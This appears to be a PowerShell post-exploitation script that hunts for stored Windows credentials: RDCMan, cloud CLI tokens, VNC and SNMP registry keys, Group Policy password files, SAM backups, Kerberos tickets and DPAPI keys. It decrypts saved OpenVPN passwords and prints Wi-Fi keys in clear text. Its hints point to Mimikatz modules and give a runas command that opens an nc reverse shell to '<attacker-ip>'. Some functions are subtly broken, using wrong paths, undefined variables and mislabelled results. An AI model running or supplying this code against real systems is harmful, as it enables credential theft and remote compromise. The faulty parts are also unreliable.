function RemoteDesktopCredentialManager {
    <#
    .DESCRIPTION
        The “Remote Desktop Credential Manager” (also known as “RDP Credential Manager” or “Windows Credential Manager”) is a Windows component that is used to store and manage 
        credentials for remote desktop connections. For example, when you connect to a remote computer using the Remote Desktop Service (RDP), you can choose to save your credentials to 
        make future connections easier. These saved credentials are stored in the Remote Desktop Credential Manager.
    #>

    if (Test-Path "$env:USERPROFILE\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings") {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " RDCMan Settings Found at: $($env:USERPROFILE)\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Extract many DPAPI masterkeys from memory with Mimikatz (sekurlsa::dpapi)."
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " Use Mimikatz dpapi module (dpapi::rdg) with appropriate /masterkey to decrypt any .rdg files."
    } else { 
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No RCDMan.Settings found."
    }
}

function CloudCredentials {
    $Users = (Get-ChildItem C:\Users).Name
    $CCreds = @(".aws\credentials",
    "AppData\Roaming\gcloud\credentials.db",
    "AppData\Roaming\gcloud\legacy_credentials",
    "AppData\Roaming\gcloud\access_tokens.db",
    ".azure\accessTokens.json",
    ".azure\azureProfile.json") 
    foreach ($u in $users) {
    $CCreds | ForEach-Object {
        if (Test-Path "c:\$u\$_") { Write-Host "$_ found!" -ForegroundColor Red }
    }
    }
}

function OpenVPNCredentials {
    $keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs" -ErrorAction SilentlyContinue
    if ($Keys) {
    Add-Type -AssemblyName System.Security
    $items = $keys | ForEach-Object { Get-ItemProperty $_.PsPath }
    foreach ($item in $items) {
        $encryptedbytes = $item.'auth-data'
        $entropy = $item.'entropy'
        $entropy = $entropy[0..(($entropy.Length) - 2)]

        $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encryptedBytes, 
        $entropy, 
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
        Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
    }
    }
}

function WifiCredentials {
    <#
    .DESCRIPTION
        Function to fetch wifi passwords.
    #>
    
    (netsh.exe wlan show profiles) -match '\s{2,}:\s' | ForEach-Object {
        $profileName = $_ -replace "^\s+:\s+"
        netsh wlan show profile name="$profileName" key=clear 
    }    
}

function OpenSSHKeys {
    if (Test-Path HKCU:\Software\OpenSSH\Agent\Keys) { 
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " OpenSSH keys found. Try this for decryption: https://github.com/ropnop/windows_sshagent_extract"
    } else { 
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No OpenSSH Keys found."
    }
}

function WinVNCPasswords {
    if (Test-Path "HKCU:\Software\ORL\WinVNC3\Password") {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " WinVNC found at HKCU:\Software\ORL\WinVNC3\Password"

        (Get-ItemProperty HKCU:\Software\ORL\WinVNC3\Password)
    } else { 
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No WinVNC found."
    }
}

function SNMPPasswords {
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP") {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " SNMP key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP"

        (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\SNMP)
    } else { 
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No SNMP found."
    }
}

function TightVNCPasswords {
    if (Test-Path "HKCU:\Software\TightVNC\Server") {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " TightVNC  key found at HKCU:\Software\TightVNC\Server"

        (Get-ItemProperty HKCU:\Software\TightVNC\Server)
    } else { 
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No TightVNC found."
    }
}

function GroupPolicyPasswords {
    $GroupPolicy = @(
        "Groups.xml", 
        "Services.xml", 
        "Scheduledtasks.xml", 
        "DataSources.xml", 
        "Printers.xml", 
        "Drives.xml"
    )

    if (Test-Path "$env:SystemDrive\Microsoft\Group Policy\history") {
        Get-ChildItem -Recurse -Force "$env:SystemDrive\Microsoft\Group Policy\history" -Include @GroupPolicy
    }

    if (Test-Path "$env:SystemDrive\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history" ) {
        Get-ChildItem -Recurse -Force "$env:SystemDrive\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history"
    }
}

function SAMSYSTEMBackup {
    <#
    .DESCRIPTION
        With a SAM and SYSTEM backup, it is possible to retrieve the password hashes of a system. If we found existing backups of both, it is easy to retrieve them.
        But it is an indicator, that the system was compromised earlier.
    #>
    
    @(
        "$Env:windir\repair\SAM",
        "$Env:windir\System32\config\RegBack\SAM",
        "$Env:windir\System32\config\SAM",
        "$Env:windir\repair\system",
        "$Env:windir\System32\config\SYSTEM",
        "$Env:windir\System32\config\RegBack\system") | ForEach-Object {
    if (Test-Path $_ -ErrorAction SilentlyContinue) {
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " $_ Found some sam & system backups. System may be compromised earlier."
    }
    }
}

function KerberosTickets {
    try { 
        klist

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " https://www.whitehat.de/active-directory-hacking-angriffe-mit-mimikatz/pass-the-ticket-ptt"
    } catch { 
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " No active sessions."
    }
}

function DPAPIMasterKeys {
    if (Test-Path "$appdataRoaming\Credentials\") {
        Get-ChildItem -Path "$appdataRoaming\Credentials\" -Force
    }
    if (Test-Path "$appdataLocal\Credentials\") {
        Get-ChildItem -Path "$appdataLocal\Credentials\" -Force
    }

    Write-Host ""
    Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
    Write-Host " Use the Mimikatz dpapi (dpapi::cred) module with appropriate /masterkey to decrypt"
}

function DPAPIRPCMasterKeys {
    $appdataRoaming = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\"
    $appdataLocal = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\"
    if (Test-Path "$appdataRoaming\Protect\") {
        Write-Host "found: $appdataRoaming\Protect\"
        Get-ChildItem -Path "$appdataRoaming\Protect\" -Force | ForEach-Object {
            Write-Host $_.FullName
    }
    }
    if (Test-Path "$appdataLocal\Protect\") {
        Write-Host "found: $appdataLocal\Protect\"
        Get-ChildItem -Path "$appdataLocal\Protect\" -Force | ForEach-Object {
            Write-Host $_.FullName
    }
    }

    Write-Host ""
    Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
    Write-Host " Use the Mimikatz dpapi (dpapi::masterkey) module with appropriate /rpc to decrypt"
}

function CachedWindowsVaultCredentials {
    <#
    .DESCRIPTION
        The windows vault stores user credentials for servers, websites and other programs that windows ca log in the users automatically.
        Windows Vault stores credentials that Windows can log in the users automatically, which means that any Windows application that needs credentials to access a resource 
        (server or a website) can make use of this Credential Manager & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.
    #>

    $creds = cmdkey.exe /list
    if($creds -like "*Type: Domain Password*") {
        Write-Host -ForegroundColor GREEN "[YES]" -NoNewline
        Write-Host " Found some cached credentials in windows vault."

        Write-Host ""
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " runas /savecred /user:WORKGROUP\Administrator C:\System32\cmd.exe"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> 'c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe'"
        Write-Host -ForegroundColor DarkGreen "[HINT]" -NoNewline
        Write-Host " https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault"
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Found NO cached credentials in windows vault."
    }
}

function Find-GPHistoryFiles {
    <#
    .DESCRIPTION
        Find files for GPP passwords.
        Files: Groups.xml|Services.xml|Scheduledtasks.xml|DataSources.xml|Printers.xml|Drives.xml
    #>

    $firstPath = "$env:SystemDrive\Microsoft\Group Policy\history"
    if (Test-Path -Path $firstPath) {
        Set-Location -Path $firstPath 2>$null
        $files = Get-ChildItem -Recurse -Name | Where-Object { $_ -match 'Groups.xml|Services.xml|Scheduledtasks.xml|DataSources.xml|Printers.xml|Drives.xml' } 2>$null
        if ($files) {
            Write-Output "Files in $firstPath :"
            $files | ForEach-Object { Write-Output $_ }
        } else {
            Write-Host -ForegroundColor RED "[NO]" -NoNewline
            Write-Host " No matching files found in $firstPath."
        }
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Path $firstPath does not exist."
    }

    $secondPath = "$env:windir\..\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history"
    if (Test-Path -Path $secondPath) {
        Set-Location -Path $secondPath 2>$null
        $files = Get-ChildItem -Recurse -Name | Where-Object { $_ -match 'Groups.xml|Services.xml|Scheduledtasks.xml|DataSources.xml|Printers.xml|Drives.xml' } 2>$null
        if ($files) {
            Write-Output "Files in $secondPath :"
            $files | ForEach-Object { Write-Output $_ }
        } else {
            Write-Host -ForegroundColor RED "[NO]" -NoNewline
            Write-Host " No matching files found in $secondPath."
        }
    } else {
        Write-Host -ForegroundColor RED "[NO]" -NoNewline
        Write-Host " Path $secondPath does not exist."
    }
}
